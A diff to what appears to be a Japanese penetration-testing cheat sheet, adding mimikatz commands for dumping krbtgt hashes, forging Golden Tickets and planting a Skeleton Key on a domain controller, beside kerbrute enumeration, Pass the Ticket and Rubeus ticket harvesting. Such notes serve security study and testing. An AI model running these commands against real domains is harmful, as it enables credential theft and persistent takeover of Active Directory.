@@ -46,9 +46,17 @@
   - 「`./kerbrute` userenum -d ドメイン名 --dc ドメコンIP Wordlists名 -o 出力ファイル名」Domainユーザの列挙
 - [mimikatz](https://github.com/gentilkiwi/mimikatz) (kali〇, C)  
   「privilege::debug」→「[output '20' OK]」でAdministrator権限を確認
+  - Golden/Silver Ticket Attacks  
+    「lsadump::lsa /inject /name:krbtgt」  
+    でkrbtgtアカウントのNTハッシュやSIDをダンプ（SilverTicketの場合は/nameで指定のユーザを指定）  
+    「Kerberos::golden /user:Administrator /domain:ドメイン名 /sid:krbtgtのSID /krbtgt:krbtgtのNTハッシュ /id:500」  
+    でGoldenTicketを作成（SilverTicketは別の方法）  
+    「misc::cmd」で先程作成したTicketに昇格する
   - Pass the Ticket  
     「sekurlsa::tickets /export」.kiribiチケットが現在地にエクスポート  
     「kerberos::ptt .kiribiチケット名」→「klist」でキャッシュされたチケットを表示で攻撃の成功を確認
+  - Skeleton Key  
+    「misc::skeleton」ドメコンのメモリ上にマスタパスワードを挿入し、AD認証をバイパスする。
 - [Rubeus](https://github.com/GhostPack/Rubeus) (kali×, C#)  
   攻撃対象のWindowsマシンで実行する、Post-Exploitationのイメージ  
   - 「`Rubeus.exe` harvest /interval:秒数」指定した秒数間、TGTを収集する  
